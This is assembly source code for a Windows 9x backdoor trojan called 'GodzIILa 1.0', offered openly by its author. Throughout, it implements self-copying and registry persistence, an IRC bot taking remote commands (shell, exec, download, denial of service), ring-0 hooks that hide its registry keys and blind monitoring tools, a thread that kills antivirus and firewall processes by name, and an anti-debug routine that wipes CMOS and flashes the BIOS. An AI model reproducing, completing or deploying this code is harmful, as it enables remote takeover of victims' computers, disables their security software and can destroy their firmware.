; COMMENT ^
; ---------------------------------------------------------------------------
;               Backdoor GodzIILa 1.0
; ---------------------------------------------------------------------------
; 
; win9x backdoor with some kewl featurez. written in offset-independant way. uses
; z0mbie's KME to produce new generations (code is fully functional, but u will 
; still need to write your own loader. code is pretty much self-explanatory and
; well commented. some parts of it were inspired by Ratter's I-worm Anarxy, which
; is a masterpiece, but done in a more optimized way. codestyle ripped from z0mbie,
; the c00l35t dude on the planet :)
; 
; Greets to IIL team members (BoyScout, DownBload, Fr1c, h4z4rd, StYx), AS, NHC team
; and everyone participating on forum discussions. 
; 
; Coded by Sunnis (annihilator@inet.hr). Come and visit IIL @ www.ii-labs.tk
; 
; 
; 
; ^


                p586
                model flat,  stdcall
                locals  __
                %NOINCL

include         ..\include\mz.inc
include         ..\include\pe.inc
include         ..\include\useful.inc
include         ..\include\myapis.inc               
include         ..\include\razno.inc
include         ..\include\s2c.inc
include         ..\maplib\fioexhdr.inc
include         ..\maplib\extrns.inc
include         ..\kme\kme.inc

; flags 

;CRC32_TEST = 1             ; integrity check via CRC32
;TRAP_TEST = 1              ; anti-debug thread: check for a tracer
;PENTIUM_TEST = 1           ; check for pentium processor
IRC_BOT = 1             ; launch an irc bot
IRC_LOG = 1             ; log the irc traffic
;LOCALHOST = 1              ; connect to the local host (irc, i used tes/tirc irc server)
BUILD_DROPPER=1             ; build a dropper
;ANTI_AV=1              ; kill local AV & FW
;STEALTH_API=1              ; stealth our registry keys
STEALTH_API2=1              ; filemon and some AV an-access monitor fuckup
;ANTI_DEBUG=1               ; check for a debugger & preform fuckup

INET_THREADZ_COUNT  equ 1   ; just an irc bot for now
CODE_CRC32      equ 0
CONNECT_PORT        equ 6667    ; hybserv on irc.carnet.hr

                .data

                db ?

                .code
troj_start:
NUM_DLLZ        equ 8

bot_password        dd  0 
            org $-4
whash           <IllegalInstructionLabs_Rock_Da_House>      ; default bot password. don't forget to change it! :)

operators:
            dd  0                   ; numba of ops
            operator MAX_OPERZ_ALLOWED dup (<>)
            dd  -1

cmd_dispatch_table: BUILD_DISPATCH_TABLE login, quit, reconnect, opme, exec, version, info, shell, chg_pswd, send
            BUILD_DISPATCH_TABLE del, reboot, ls, pwd, cd, mkdir, rmdir, move, copy, spawn
            BUILD_DISPATCH_TABLE msgbox, cleanclip, beep, closeaw, opencd, closecd, minaw, syskill, killkeyb, killmouse
            BUILD_DISPATCH_TABLE logout, download, procs, kill, opers, dos, stopdos
            db  5, 01h, "PING"
            dd  offset bot_PING_cmd
            db  9, 01h, "DCC SEND"
            dd  offset bot_recv_cmd
            db  0

start:
IFDEF BUILD_DROPPER
include         dropper.asm
include         ..\include\console.inc
ENDIF ; BUILD_DROPPER
            
troj_entry:     pusha
            @SEH_SetupFrame <jmp    troj_exit>
            call    $+5
gdelta:         pop ebp                 ; calculate global delta handle

G           equ <-gdelta[ebp]>              ; all variables relative to gdelta will be accessed in form of: varname G

IFDEF CRC32_TEST
            lea edx, __CRC32_prot G         ; take ptr to CRC32 protected code
            mov ecx, troj_end-__CRC32_prot      ; size of code
            call    CRC32                   ; calculate CRC32

            db  02dh                    ; and compare it...
crc32_glob      dd  CODE_CRC32
    
__CRC32_prot:       neg eax                 ; (CRC32 == OK) ? CF=0 : CF=1
            sbb ecx, ecx                ; CF->ECX
            jecxnz  troj_exit
ENDIF ; CRC32_TEST
            
IFDEF PENTIUM_TEST
            pushf
            pop ecx                 ; EFLAGS -> ecx
            mov eax, ecx                ; now in eax
            bts eax, 21                 ; set ID bit
            push    eax
            popf                        ; eax -> EFLAGS
            pushf
            pop eax                 ; EFLAGS -> eax
            sub ecx, eax                ; is it the same?
            jecxz   troj_exit               ; blah, we r on 486-

            xor eax, eax
            inc eax                 ; eax = 1 for cpuid
            cpuid
            and eax, (16-1) shl 8           ; proc. family r bits 8-11
            cmp ah, 4                   ; is it 486?
            jz  troj_exit               ; lucky 486 :)
ENDIF ; PENTIUM_TEST
            call    get_base                ; load kernel imagebase

            lea edi, kernel G
            stosd                       ; save it
            lea edi, [edi+kernel32-kernel-4]        ; add the difference and substract NULL offset
            push    edi                 ; save it 4 l8r
            stosd                       ; into first dll record
            xchg    ebx, eax                ; kernel imagebase goes into ebx
            gethash <LoadLibraryA>              ; we need this API to map those dlls into ur own address space
            push    hash                    ; push calculated hash
            call    load_dll_address            ; and find the damn API

            xchg    esi, eax                ; esi = LoadLibraryA
            lea edi, [edi+size dll_record-4]        ; lea   edi, [ebp+shlwapi-gdelta] = second dll record, but this 1 produces smaller opcode 
            push    NUM_DLLZ-1              ; counter into ebx
            pop ebx

            @pushsz "WINMM"                 ; TODO: crypt somehow this crap
            @pushsz "MSVCRT"
            @pushsz "ADVAPI32"              ; reverse order
            @pushsz "WS2_32"
            @pushsz "WININET"
            jmp a0001_skip              ; skip exit routine

troj_exit:      @SEH_RemoveFrame                ; i've put it here so that it can be in the range of those jecxz
            popa
            push    0
            db  0b8h
_dd_ExitThread      dd  ?           
            call    eax

a0001_skip:     @pushsz "USER32"
            @pushsz "SHLWAPI"
__1:            call    esi                 ; LoadLibraryA
            stosd                       ; save it in dll record
            lea edi, [edi+9]                ; skip unnecessary structure members
            dec ebx
            jnz __1                 ; decrement counter and loop

            mov ebx, ebp
            sub ebx, offset gdelta          ; ebx = delta offset

            push    NUM_DLLZ
            pop ecx                 ; for all dll records

            pop edi                 ; lea   edi, [ebp+kernel32-gdelta]
            push    edi                 ; we'll need it l8r
__rel:          lea edi, [edi.Hash_table]           ; skip Dll_Imagebase
            mov esi, edi                ; to esi as store ptr
            lodsd                       ; take a hard-coded value
            add eax, ebx                ; relocate
            stosd                       ; and save it
            lodsd                       ; repeat for Address_table
            add eax, ebx                ; relocate
            stosd                       ; and save it
            inc edi                 ; skip Api_number
            loop    __rel                   ; loop for every dll record

            pop esi                 ; lea   esi, [ebp+kernel32-gdelta]
            push    NUM_DLLZ
            pop ecx                 ; all the dlls

__dll:          pusha
            lodsd
            xchg    eax, ebx                ; ebx = dll imagebase
            lodsd
            push    eax                 ; save ptr to Hash_table
            lodsd                       ; take ptr to Address_table
            xchg    eax, edi                ; in edi
            lodsb
            movzx   ecx, al                 ; Api_number in ecx
            pop esi                 ; and restore esi

__api:          lodsd                       ; take APIs hash
            push    eax                 ; push it as procedure param.
            call    load_dll_address            ; find its address
            xchg    eax, ecx
            jecxz   troj_exit               ; exit on error
            xchg    eax, ecx
            stosd                       ; save APIs address
            loop    __api                   ; and loop for all APIs

            add [esp.Pushad_esi], size dll_record   ; take ptr to next dll record
            popa
            loop    __dll                   ; and loop for that dll

            PATCH_API   ExitThread, wsprintfA, HeapAlloc, HeapFree

            lea esi, _OpenMutexA G
            x_push  eax, KewlMutex~
            push    esp
            xor ebx, ebx
            push    ebx
            push    SYNCHRONIZE
            lodsd
            
            call    eax                 ; OpenMutexA
            x_pop
            xchg    eax, ecx
            ;jecxz  __new                   ; is it already installed?
            jmp __new

            push    ecx
            lodsd
            call    eax                 ; CloseHandle
            
            jmp troj_exit

__new:          add esi, 4
            push    ebx ebx ebx ebx ebx
            callg   PeekMessageA                ; remove the hour-glass cursor

            lodsd
            push    1                   ; disable error messages
            call    eax                 ; SetErrorMode

            push    ebx ebx ebx
            lodsd
            call    eax                 ; HeapCreate

            test    eax, eax
            jz  troj_exit

            mov _dd_heap_handle G, eax
            mov _dd_heap_handle_1 G, eax
            mov heap_handle G, eax

            mov eax, fs:[TEB_PEB]           ; take ptr to PEB
            test    eax, eax                ; is it above 80000000h?
            jns NT_startup              ; if so, we r on NT
            
            lodsd
            xchg    eax, ecx
            jecxz   __skip                  ; is RegisterServiceProcess present?

            push    1
            push    ebx
            call    ecx                 ; is so, stealth ourselvez
            
__skip:         mov eax, 200
            call    malloc
            xchg    eax, ebx
            
            push    esi
            lea     esi, _get_r0_mark G
            call    call_in_ring0
            movzx   ecx, (_which_gen G).byte ptr 0

            jecxz   __first_gen
            dec ecx
            jecxz   __loaded_in_windir
            
            jmp __ex
                                    
__first_gen:        inc (_which_gen G).byte ptr 0
            lea esi, _store_r0_mark G
            call    call_in_ring0
            pop esi
            
            call    __do_file_copy
            
            xor eax, eax
            push    eax
            push    eax
            push    eax
            push    eax
            push    eax
            push    STARTF_USESHOWWINDOW
            push    10
            pop ecx
            push    eax
            loop    $-1
            push    68
            mov edx, esp
            
            
            sub esp, size PROCESS_INFORMATION
            push    esp
            push    edx
            push    eax
            push    eax
            push    CREATE_NEW_CONSOLE          ; !!
            push    eax
            push    eax
            push    eax
            push    eax
            push    ebx
            callg   CreateProcessA              ; Y DA FUCK IT INHERITS DOS WINDOW??
            
            add esp, 68+size PROCESS_INFORMATION
            
__ex:           xor ecx, ecx
            push    ecx
            callg   GetModuleHandleA
            
            push    eax
            callg   FreeLibrary
            
            push    edi
            callg   DeleteFileA
            
            xchg    eax, edi
            call    free
            
            push    0
            callg   ExitProcess             ; ExitThread surprisingly causes gpf, but only when trw200 is on!
            
__loaded_in_windir: mov (_which_gen G).byte ptr 0, 2
            lea esi, _store_r0_mark G
            call    call_in_ring0
            pop esi
            
            jmp __continue
                        
__do_file_copy:     push    ebx esi

            push    8
            pop ebx
            x_push  eax, !%windir!%\system\system32.exe~
            lea edi, [esp+16]
            mov esi, _Sleep G
            call    GenRandString
            x_stosd <.exe>
            xor al, al
            stosb

            mov esi, [esp+_xsize]
            mov ebx, [esp+_xsize+4]
            _xsize  = _xsize+8
            
            mov ecx, esp
            push    200
            push    ebx
            push    ecx
            lodsd
            call    eax                 ; ExpandEnvironmentStringsA
            x_pop
    
            mov eax, 300
            call    malloc
            xchg    eax, edi
    
            push    300
            push    edi
            push    0
            lodsd
            call    eax                 ; GetModuleFileNameA
    
            push    0
            push    ebx
            push    edi
            lodsd
            call    eax                 ; CopyFileA

            retn
            
__continue:     push    200
            push    ebx
            push    0
            callg   GetModuleFileNameA
            xchg    eax, ecx
            
            x_push  eax, <Software\Microsoft\Active Setup\Installed Components\EvionInstall~>
            mov edi, _xsize
            mov ecx, esp
            x_push  eax, <StubPath~>
            add edi, _xsize
            mov eax, esp
            push    esi
            push    ebx
            push    REG_SZ
            push    eax
            push    ecx
            push    HKEY_LOCAL_MACHINE
            callg   SHSetValueA
            lea esp, [esp+edi]              ; adjust stack frame

            x_push  ecx, <Software\Microsoft\Active Setup\Installed Components\EvionInstall~>
            push    esp
            push    HKEY_CURRENT_USER
            callg   SHDeleteKeyA
            x_pop

            xchg    eax, ebx
            call    free

            x_push  eax, KewlMutex~
            push    esp
            push    1
            push    0
            callg   CreateMutexA
            x_pop
    
            test    eax, eax
            jz  troj_exit

            callg   GetLastError
            
            xor al, ERROR_ALREADY_EXISTS
            jz  troj_exit

IFDEF ANTI_AV
            lea eax, anti_av_thread G
            call    Create_Thread
            mov h_av_thread G, eax
ENDIF ; ANTI_AV

IFDEF STEALTH_API
            lea eax, stealth_thread G
            call    Create_Thread
            mov h_stealth_thread G, eax
ENDIF ; STEALTH_API

IFDEF STEALTH_API2
            lea eax, stealth_thread2 G
            call    Create_Thread
            mov h_stealth_thread2 G, eax
ENDIF ; STEALTH_API2

IFDEF ANTI_DEBUG
            lea eax, killer_thread G
            call    Create_Thread
            mov h_killer_thread G, eax
ENDIF ; ANTI_DEBUG

__main_thread_wait: push    1000
            callg   Sleep

__main_thread:      call    onlyne
            jecxz   __main_thread_wait

            mov (_onlyne_flag G).byte ptr 0, 1

            sub esp, 1000h
            push    esp
            push    1
            callg   WSAStartup
            add esp, 1000h

            test    eax, eax
            jnz troj_exit

IFDEF IRC_BOT
            lea eax, ircbot_thread G
            call    Create_Thread
            mov inet_threadz G, eax
ENDIF ; IRC_BOT

__onlyne_loop:      push    1000
            callg   Sleep

            call    onlyne
            jecxz   __not_onlyne

            jmp __onlyne_loop

__not_onlyne:       and (_onlyne_flag G).byte ptr 0, 0

            push    -1
            push    1
            lea eax, inet_threadz G
            push    eax
            push    INET_THREADZ_COUNT
            callg   WaitForMultipleObjects

            inc eax
            cmp eax, WAIT_TIMEOUT
            jnz __close_threads

            lea esi, inet_threadz G
            push    INET_THREADZ_COUNT
            pop ecx

__kill_threads:     push    ecx
            push    0
            lodsd
            push    eax
            callg   TerminateThread
    
            pop ecx
            loop    __kill_threads

__close_threads:    lea esi, inet_threadz G
            push    INET_THREADZ_COUNT
            pop ecx

__close_handles:    push    ecx
            lodsd
            push    eax
            callg   CloseHandle

            pop ecx
            loop    __close_handles

            callg   WSACleanup

            push    (heap_handle G).dword ptr 0
            callg   HeapDestroy

            jmp __main_thread

killer_thread       proc    pascal
            
            call    $+5
killdelta:      pop ebx

_killa          equ <-killdelta[ebx]>

__cycle:
IFDEF TRAP_TEST
            pusha
            lea eax, _traced _killa         ; calculate offset of _traced_off
            mov _traced_off _killa, eax         ; and store it
            xor eax, eax
            call    __trap

            mov eax, 12345678h
_traced_off     equ $-4
            inc byte ptr [eax]              ; byte ptr [ebp+_traced-gdelta], set the mark
            xor eax, eax
            retn

__trap:         push    dword ptr fs:[eax]          ; set new SEH frame
            mov fs:[eax], esp

            pushf
            or  byte ptr [esp+1], 1         ; set TF (bit 8)
            popf
            nop

            xor eax, eax
            pop     dword ptr fs:[eax]
            pop     ebx                 ; add esp, 4 if it was an exception, otherwise remove the return address
            popa
            dec (_traced _killa).byte ptr 0
            js  __do_fuckup             ; some asshole is tracing us...
ENDIF ; TRAP_TEST
            mov eax, ebx
            cdq
            mov eax, fs:[edx.TEB_ClientId.CID_UniqueProcess]    ; test app-level debugger
            xor eax, ecx
            xor ecx, eax
            xor eax, ecx
            jecxnz  __do_fuckup
            
            call    _GetTickCount _killa 
            xchg    eax, ebx
            nop
            nop
            call    _GetTickCount _killa 
            sub eax,ebx
            jnz __do_fuckup
            
            x_push  eax, <\\.\SICE>
            mov eax, esp
            cdq
            push    edx
            push    FILE_ATTRIBUTE_READONLY
            push    OPEN_EXISTING
            push    edx
            push    FILE_SHARE_READ
            push    GENERIC_READ
            push    eax
            call    _CreateFileA _killa
            inc eax
            jz  __do_fuckup
            
            jmp __cycle

__do_fuckup:        lea esi, __r0_fuckup _killa
            call    call_in_ring0

__r0_fuckup:        xor     al, al                  ; fuck CMOS
__cmos:         out     70h, al
            out     71h, al
            dec     al
            jnz     __cmos
            
            call    cihflash                ; yo momma :))

            int 19h                 ; hang 'em all!
            
killer_thread       endp

stealth_thread2     proc    pascal
            call    $+5
stealthdlta2:       pop ebx

_STLTH2         equ <-stealthdlta2[ebx]>
            
            lea eax, _this_name _STLTH2
            push    MAX_PATH
            push    eax
            push    0
            call    _GetModuleFileNameA _STLTH2
            xchg    eax, ecx
            jecxz   __1
            
            mov __this_length _STLTH2, ecx
            
            lea esi, __ring_fs _STLTH2
            call    call_in_ring0
__1:            jmp $

__ring_fs:      pusha

            push    PAGEFIXED or PAGEZEROINIT       ; flags
                        xor     eax, eax
                        push    eax                     ; *PhysAddr
                        push    eax                     ; maxPhys
                        push    eax                     ; minPhys
                        push    eax                     ; AlignMask
                        push    eax                     ; handle of VM (==0 if PG_SYS)
                        push    PG_SYS                  ; pType
                        push    (stealthsplore_size+4095) shr 12    ; nPages
                        VMMcall PageAllocate
                        add     esp, 8*4

                        mov [esp.Pushad_eax], eax           ; eax = mem handle

                        push    PC_STATIC                       ; OR_MASK
                        push    not (PC_WRITEABLE+PC_USER)      ; AND_MASK
                        push    (stealthsplore_size+4095) shr 12
                        shr     eax, 12
                        push    eax
                        VMMcall PageModifyPermissions           ; make pages inaccessible from ring3
                        add     esp, 4*4

            mov edi, [esp.Pushad_eax]
            push    edi
            lea esi, stealthsplore_start _STLTH2
            mov ecx, stealthsplore_size
            rep movsb
            
            pop eax
        
            push    eax
            push    eax
            VxDcall IFSMGR, InstallFileSystemApiHook
            add esp, 4
            
            pop edi
            push    edi
            add edi, __old_hook-stealthsplore_start
            stosd
            
            push    IFSMGR
            pop eax
            VMMcall Get_DDB
            pop esi
            test    ecx, ecx
            jz  __end
        
            push    esi
            add esi, IFSApiHook_hook-stealthsplore_start
            mov ebx, InstallFileSystemApiHook
            call    hook_service
            ;pop    edi                 ; uncomment this if u want to to use IFSApiHook..
            ;push   edi
            ;xchg   esi, [edi+_origifshook-stealthsplore_start]
            
            pop esi
            push    esi
            add esi, Ring0_FileIO_hook-stealthsplore_start
            mov ebx, Ring0_FileIO
            call    hook_service
            pop edi
            xchg    esi, [edi+_orig_Ring0_FileIO-stealthsplore_start]
        
__end:          popa
            retf

stealthsplore_start:    push    ebx                 ; u have no fuckin idea how much gpf did it took me 
                                    ; to realize that ebx modification fucks-up kernel..
            call    $+5
_sploredlta:        pop ebx

_STLTH2_        equ <-_sploredlta[ebx]>

__quit:         db  0beh
__old_hook      dd  ?

            movzx   ecx, (ifs_first_run _STLTH2_).byte ptr 0
            jecxz   __continue
            dec (ifs_first_run _STLTH2_).byte ptr 0
                        
            lodsd
__find_sys:     lodsd
            xchg    eax, esi
            lodsd
            xchg    eax, ecx
            lodsd
            cmp eax, ecx
            jnz __find_sys
            
            mov (sys_handler _STLTH2_).dword ptr 0, eax
__continue:     
            mov eax, (sys_handler _STLTH2_).dword ptr 0
            pop ebx
            jmp eax

IFSApiHook_hook:    
;           db  0beh                    ; uncoment this if u want to use this shit somehow..
;_origifshook       dd  ?                   
            
            xor eax, eax                ; no hook 4u, mister file-wanna-monitor
            retn

Ring0_FileIO_hook:  push    esi
            db  0beh
_orig_Ring0_FileIO  dd  0
            push    esi
            mov esi, [esp+4]
            pusha

            call    $+5
_r0ifshookdlta:     pop ebx

_IFSr0HOOK      equ <-_r0ifshookdlta[ebx]>
            
            cmp eax, R0_OPENCREATFILE
            jnz __done_cmp
            
            lea edi, _this_name _IFSr0HOOK
            dec edi
            mov ecx, __this_length _IFSr0HOOK
__do_cmp:       lodsb
            test    al, al
            jz  __done_cmp
            inc edi
            cmp al, byte ptr [edi]
            loopz   __do_cmp

            popa
            stc
; stealth? either an ifs driver file corruption occured on my haed drive, or non of those r3 file interfaces r
; connected with this... atm, i have no fuckin desire to investigate this further. r0 on w9x sucks!!!
            retn
            
__done_cmp:     popa
            retn    4
            

ifs_flag        db  0
ifs_first_run       db  1
sys_handler     dd  0
_this_name      db  MAX_PATH dup(0)
__this_length       dd  0

stealthsplore_size  equ $-stealthsplore_start

stealth_thread2     endp


stealth_thread      proc    pascal

            call    $+5
stealthdlta:        pop ebx

_STLTH          equ <-stealthdlta[ebx]>
            
            lea esi, __ring0_code _STLTH
            call    call_in_ring0
            jmp $

__ring0_code:       pusha
            
                        push    PAGEFIXED or PAGEZEROINIT       ; flags
                        xor     eax, eax
                        push    eax                     ; *PhysAddr
                        push    eax                     ; maxPhys
                        push    eax                     ; minPhys
                        push    eax                     ; AlignMask
                        push    eax                     ; handle of VM (==0 if PG_SYS)
                        push    PG_SYS                  ; pType
                        push    (stealthcode_size+4095) shr 12      ; nPages
                        VMMcall PageAllocate
                        add     esp, 8*4

                        mov [esp.Pushad_eax], eax           ; eax = mem handle

                        push    PC_STATIC                       ; OR_MASK
                        push    not (PC_WRITEABLE+PC_USER)      ; AND_MASK
                        push    (stealthcode_size+4095) shr 12
                        shr     eax, 12
                        push    eax
                        VMMcall PageModifyPermissions           ; make pages inaccessible from ring3
                        add     esp, 4*4

            mov edi, [esp.Pushad_eax]           ; copy some stealthcode
            push    edi
            lea esi, stealthcode_start _STLTH
            mov ecx, stealthcode_size
            rep movsb

            push    1
            pop eax
            VMMcall Get_DDB
            test    ecx, ecx
            jz  __end
            pop eax
            mov edx, [ecx+30h]  
            mov [eax+service_ptr_table-stealthcode_start], edx

            HOOK_SERVICE    _RegEnumKey
            HOOK_SERVICE    _RegOpenKey
            HOOK_SERVICE    _RegCreateKey
            HOOK_SERVICE    _RegDeleteKey
            HOOK_SERVICE    Hook_DS             ; bye bye regmon... :)
            NUMBA_HOOKED_SERVICES   equ 5
            
__end:          popa
r0__err:        retf

stealthcode_start:
hook_RegEnumKey     proc    c
            arg hKey:DWORD
            arg iSubKey:DWORD
            arg lpszName:DWORD
            arg cchName:DWORD
    
            pushf
            pusha
            call    DDB_regenarate
            
            push    cchName
            push    lpszName
            push    iSubKey
            push    hKey
            db  0b8h
real_RegEnumKey     dd  ?           
            call    eax
            
            add esp, 4*4
            xchg    eax, ebx
            lea esi, lpszName
            lodsd
            xchg    eax, ecx
            jecxz   __1
            cmp [ecx], "oivE"
            jnz __1
            cmp [ecx+4], "snIn"
            jnz __1
            mov ebx, ERROR_NO_MORE_ITEMS

__1:            mov [esp.Pushad_eax], ebx
            popa
            popf
            ret
hook_RegEnumKey     endp

hook_RegOpenKey     proc    c
            arg hkey
            arg lpszSubKey
            arg phkResult
            
            pushf
            pusha
            call    DDB_regenarate
            
            lea esi, lpszSubKey
            lodsd
            xchg    eax, ecx
            jecxz   __open_key
            xchg    ecx, esi
            @endsz
            cmp [esi-5], "llat"
            jnz __open_key
            cmp [esi-9], "snIn"
            jnz __open_key
            mov eax, ERROR_BADKEY
            jmp __end
                        
__open_key:     push    phkResult
            push    lpszSubKey
            push    hkey
            db  0b8h
real_RegOpenKey     dd  ?
            call    eax
            
            add esp, 3*4
__end:          mov [esp.Pushad_eax], eax
            popa
            popf
            ret
hook_RegOpenKey     endp

hook_RegCreateKey   proc    c
            arg hkey
            arg lpszSubKey
            arg phkResult
            
            pushf
            pusha
            call    DDB_regenarate
            
            lea esi, lpszSubKey
            lodsd
            xchg    eax, ecx
            jecxz   __create_key
            xchg    ecx, esi
            @endsz
            cmp [esi-5], "llat"
            jnz __create_key
            cmp [esi-9], "snIn"
            jnz __create_key
            mov eax, ERROR_BADKEY
            jmp __end
                        
__create_key:       push    phkResult
            push    lpszSubKey
            push    hkey
            db  0b8h
real_RegCreateKey   dd  ?
            call    eax
            
            add esp, 3*4
__end:          mov [esp.Pushad_eax], eax
            popa
            popf
            ret
hook_RegCreateKey   endp

hook_RegDeleteKey   proc    c
            arg hKey
            arg lpszSubKey
            
            pushf
            pusha
            call    DDB_regenarate

            lea esi, lpszSubKey
            lodsd
            xchg    eax, ecx
            jecxz   __del_key
            xchg    ecx, esi
            @endsz
            cmp [esi-5], "llat"
            jnz __del_key
            cmp [esi-9], "snIn"
            jnz __del_key
            mov eax, ERROR_FILE_NOT_FOUND
            jmp __end

__del_key:      push    lpszSubKey
            push    hKey
            db  0b8h
real_RegDeleteKey   dd  ?
            call    eax
            
            add esp, 8
__end:          mov [esp.Pushad_eax], eax
            popa
            popf
            ret
hook_RegDeleteKey   endp

hookHook_DS     proc    c
            
            pusha
            call    DDB_regenarate

            movzx   ecx, ax
            cmp ecx, _RegOpenKey
            jb  __check_hook
            cmp ecx, _RegSetValueEx
            ja  __ok_hook
__bad_hook:     popa
            stc
            ret

__check_hook:       cmp ecx, Hook_Device_Service
            jz  __bad_hook
__ok_hook:      db  0b8h
realHook_DS     dd  ?
            mov [esp.Pushad_esi], esi
            popa
            ret
hookHook_DS     endp

DDB_regenarate      proc    c
            pusha
            
            db  0bah                    ; edx
service_ptr_table   dd  ?
            
            call    __service_table
            dd  _RegEnumKey
@_RegEnumKey        dd  ?
            dd  _RegOpenKey
@_RegOpenKey        dd  ?
            dd  _RegCreateKey
@_RegCreateKey      dd  ?
            dd  _RegDeleteKey
@_RegDeleteKey      dd  ?
            dd  Hook_DS
@Hook_DS        dd  ?
__service_table:    pop esi
            push    NUMBA_HOOKED_SERVICES
            pop ecx
__cycle:        lodsd
            xchg    eax, ebx
            lodsd
            mov [edx+ebx*4], eax
            loop    __cycle
            popa
            ret
DDB_regenarate      endp

stealthcode_size    equ $-stealthcode_start

stealth_thread      endp
            
anti_av_thread      proc    pascal

            local   wh
            local   buffer:byte:512
            local   pid
            local   p_handle
            local   p_entry:PROCESSENTRY32

            call    $+5
avdelta:        pop ebx

_AV         equ <-avdelta[ebx]>

            mov __av_ebp_patch _AV, ebp
            mov __av_ebx_patch _AV, ebx
            mov __av_ebp_patch_ _AV, ebp
            
__kill_av:      push    ebx
            push    0
            lea eax, __av_win_enum _AV
            push    eax
            call    _EnumWindows _AV
            pop ebx

            push    0
            push    TH32CS_SNAPPROCESS
            call    _CreateToolhelp32Snapshot _AV
            
            inc eax
            jz  __end__snapshot
            dec eax
            mov p_handle, eax

            lea ecx, p_entry
            mov [ecx.dwSize], size PROCESSENTRY32
            push    ecx
            push    eax
            call    _Process32First _AV
__cycle_procs:      test    eax, eax
            jz  __proc_done
            
            call    _GetCurrentProcessId _AV
            cmp eax, p_entry.th32ProcessID
            jz  __next_proc
            
            lea esi, p_entry.szExeFile
__slash:        mov edx, esi
__endsz:        lodsb
            cmp al, '\'
            jz  __slash
            test    al, al
            jnz __endsz

            mov esi, edx
            call    lowercase
            mov edx, esi
            
            xor eax, eax
__hasherize:        rol eax, 7
            xor al, [edx]
            inc edx
            cmp byte ptr [edx], '.'
            jz  __out       
            cmp byte ptr [edx], 0
            jnz __hasherize

__out:          lea edi, good_namez _AV
            mov ecx, good_namez_numba
            repnz   scasd
            jz  __next_proc
            
            lea edi, bad_namez _AV
            mov ecx, bad_namez_numba
            repnz   scasd
            jnz __next_proc
            
            push    p_entry.th32ProcessID
            push    0
            push    PROCESS_TERMINATE
            call    _OpenProcess _AV
            
            push    0
            push    eax
            call    _TerminateProcess _AV
            
__next_proc:        lea eax, p_entry
            push    eax
            push    p_handle
            call    _Process32Next _AV
            jmp __cycle_procs
            
            test    eax, eax
            jnz __cycle
            pop eax
            
__proc_done:        push    p_handle
            call    _CloseHandle _AV
            
__end__snapshot:    push    50
            call    _Sleep _AV

            jmp __kill_av

__av_win_enum:      push    ebp 
            mov ebp, 0
            org $-4
__av_ebp_patch      dd  ?
            mov eax, [esp.Pshd.Arg1]
            mov wh, eax
            pop ebp
            pusha
            mov ebx, 0
            org $-4
__av_ebx_patch      dd  ?   
            mov ebp, 0
            org $-4
__av_ebp_patch_     dd  ?
            push    ecx
            push    esp
            push    wh
            call    _GetWindowThreadProcessId _AV

            pop ecx
            mov pid, ecx
            jecxz   __end__end

            push    512
            lea esi, buffer
            push    esi
            push    wh
            call    _GetWindowTextA _AV
            xchg    eax, ecx
            jecxz   __end__end

            call    lowercase

            push    ebx
            mov edx, ecx
            mov ecx, av_names_numba
            lea edi, av_namez_hashes _AV
            lea ebx, av_names_length _AV

__process_string:   pusha
            mov ecx, edx
            movzx   ebx, [ebx].byte ptr 0
            sub ecx, ebx
            inc ecx
            js  __too_lil_end
            jecxz   __too_lil_end

__cycle:        push    ebx
            push    esi
            xor edx, edx
__hash:         rol edx, 7
            xor dl, [esi]
            lodsb
            dec ebx
            jnz __hash
            pop esi
            pop ebx
            lodsb
            
            cmp edx, [edi]
            jz  __found
            loop    __cycle
            
            add [esp.Pushad_edi], 4
            inc [esp.Pushad_ebx]
            popa
            loop    __process_string
            
__end__kend:        pop ebx
__end__end:     popa
            push    1
            pop eax
            retn

__too_lil_end:      popa
            jmp __end__kend

__found:        popa
            pop ebx

            xor esi, esi
            push    esi
            push    esi
            push    WM_QUIT
            push    wh
            call    _PostMessageA _AV
            
            push    10
            call    _Sleep _AV
            
            push    pid
            push    esi
            push    PROCESS_TERMINATE
            call    _OpenProcess _AV
            
            push    esi
            push    eax
            call    _TerminateProcess _AV
            
            popa
            retn
            
__end:          push    (h_av_thread G).dword ptr 0
            call    _CloseHandle _AV
            
            lea eax, anti_av_thread _AV
            call    Create_Thread               ; BUG!!! FIXAJ rel. adr.
            mov h_av_thread _AV, eax
            
            push    0
            call    _ExitThread _AV

av_namez_hashes:    whash   <virus, anti, firewall, process, zonealarm, amon, nod32, blackice, kill98, norton>
            whash   <kv3000, cilin, av98, dr.web, trojan, winrescue, lockdown, avp, sophos, f-prot>
            whash   <mcafee, e-scan, kaspersky, kav, wintop, apispy, apimon, sysview, sysmon, apithunk>
            whash   <procdump>
av_names_numba      equ ($-av_namez_hashes)/4

av_names_numba_start:
av_names_length     db  5, 4, 8, 7, 9, 4, 5, 8, 6, 6
            db  6, 5, 4, 6, 6, 9, 8, 3, 6, 6
            db  6, 6, 9, 3, 6, 6, 6, 7, 6, 8
            db  8

good_namez:     whash   <kernel32, msgsrv32, mprexe, mmtask, mstask, explorer, internat, taskmon, systray, rundll>
            whash   <wmiexe, winoa386, system, [system|process], [system|idle|process], smss, os2ss, os2srv>
            whash   <csrss, winlogon, services, lsass, svchost, spoolsv, regsvc, ntvdm, cmd, taskmgr>
            whash   <nddeagnt, spoolss, rpcss, tapisrv, rasman>
good_namez_numba    equ ($-good_namez)/4

bad_namez:      whash   <pop3scan, nod32, nod32cc, amon, _avp32, _avpcc, npssvc, nresq32, nsched32> 
            whash   <nschednt, nsplugin, nav, navapsvc, navapw32, navlu32, navrunr, navw32, _avpm, alertsvc>
            whash   <avp32, avpcc, avpm, n32scanw, navwnt, antivir, avpupd, avgctrl, avwin95, scan32, vshwin32>
            whash   <f-stopw, f-prot95, ackwin32, vettray, vet95, sweep95, pccwin98, iomon98, avptc, ave32>
            whash   <avconsol, fp-win, dvp95, f-agnt95, claw95, nvc95, scan, virus, lockdown2000, norton>
            whash   <mcafee, pcciomon, pccmain, pop3trap, webtrap, avsynmgr, vsstat, nmain, luall, lucomserver>
            whash   <iamapp, atrack, nisserv, rescue32, symproxysvc, nisum, pview95, webscanx, safeweb, icmon>
            whash   <cfinet, cfinet32, avp, zonealarm, wink, zapro, zatutor, vmon, zauinst, minilog>
            whash   <lockdown, ants, fast, guard, update, autoupdate, tc, spyxx, clean, drwatson>
            whash   <sfc, msinfo32, cleaner, lsetup, aupdate, lual, luinit, navstub, bootwarn, qconsole>
            whash   <qserver, navdx, undoboot, cfgwiz, moolive, tca, tcm, tds-3, ss3edit, anti_trojan>
